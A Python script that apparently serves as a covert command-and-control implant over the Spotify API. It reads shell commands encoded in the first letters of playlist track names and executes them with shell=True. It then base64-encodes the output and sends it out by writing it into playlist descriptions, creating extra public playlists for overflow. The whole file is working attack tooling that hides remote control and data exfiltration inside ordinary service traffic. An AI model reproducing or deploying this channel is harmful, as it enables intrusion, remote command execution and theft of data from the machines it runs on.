import requests
import os
import subprocess
import base64
import json
import random

#Get list of playlists associated with auth token
headers = {
    'Authorization': 'Basic <base64 clientid:secret>',
}

data = {
  'grant_type': 'refresh_token',
  'refresh_token': '<refresh token>'
}

response = requests.post('https://accounts.spotify.com/api/token', headers=headers, data=data)

js_response = response.json()

access_token = js_response['access_token']

headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + access_token,
}

response = requests.get('https://api.spotify.com/v1/me/playlists?fields=items(id)', headers=headers)

pl = response.json()

plsize = len(pl['items'])

#Retrieve command from playlist tracks
for i in range(0, plsize):
	playlist_id = pl['items'][i]['id']
	r = requests.get('https://api.spotify.com/v1/playlists/' + playlist_id + '/tracks?fields=items(track(name))', headers={'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + access_token})
	
	data = r.json()
	command = ''
	size = len(data['items'])
	for j in range(0,size):
		command += (data['items'][j]['track']['name'][0])

	command = command.lower()
	command = command.replace("space", " ")
	command = command.replace("hiphen", "-")
	command = command.replace("fslash", "/")
	command = command.replace("bslash", "\\")
	command = command.replace("ebang", "!")
	command = command.replace("epound", "#")
	command = command.replace("edollar", "$")
	command = command.replace("eatsym", "@")
	command = command.replace("eperc", "%")
	command = command.replace("ecarr", "^")
	command = command.replace("eand", "&")
	command = command.replace("estar", "*")
	command = command.replace("eopar", "(")
	command = command.replace("ecpar", ")")
	command = command.replace("eplus", "+")
	command = command.replace("eeq", "=")
	command = command.replace("edot", ".")
	command = command.replace("ecoma", ",")
	command = command.replace("eques", "?")
	command = command.replace("eone", "1")
	command = command.replace("etwo", "2")
	command = command.replace("ethree", "3")
	command = command.replace("efour", "4")
	command = command.replace("efive", "5")
	command = command.replace("esix", "6")
	command = command.replace("eseven", "7")
	command = command.replace("eeight", "8")
	command = command.replace("enine", "9")
	command = command.replace("ezero", "0")
		
	output = subprocess.check_output(command, shell=True)

	#Base64 encode output of command
	encodedBytes = base64.b64encode(output)
	encodedStr = str(encodedBytes, "utf-8")

	headers = {
    	'Authorization': 'Basic <base64 clientid:secret>',
	}

	data = {
  		'grant_type': 'refresh_token',
  		'refresh_token': '<refresh token>'
	}

	response = requests.post('https://accounts.spotify.com/api/token', headers=headers, data=data)

	js_response = response.json()

	access_token = js_response['access_token']

	
	#Add output to description, size limit 300 characters
	split_output = [encodedStr[k:k+299] for k in range(0, len(encodedStr), 299)]

	headers = {
	    'Accept': 'application/json',
	    'Content-Type': 'application/json',
	    'Authorization': 'Bearer ' + access_token,
	}

	data = '{"description":"' + split_output[0] + '"}'

	response = requests.put('https://api.spotify.com/v1/playlists/' + playlist_id, headers=headers, data=data)
	
	split_output.pop(0)

	#Create extra playlists if necessary
	inc = 1
	for chunk in split_output:
		playlist_name = playlist_id + str(inc)
		data = '{"name":"' + playlist_name + '","description":"' + chunk + '","public":true}'

		response = requests.post('https://api.spotify.com/v1/me/playlists', headers=headers, data=data)

		inc = inc + 1








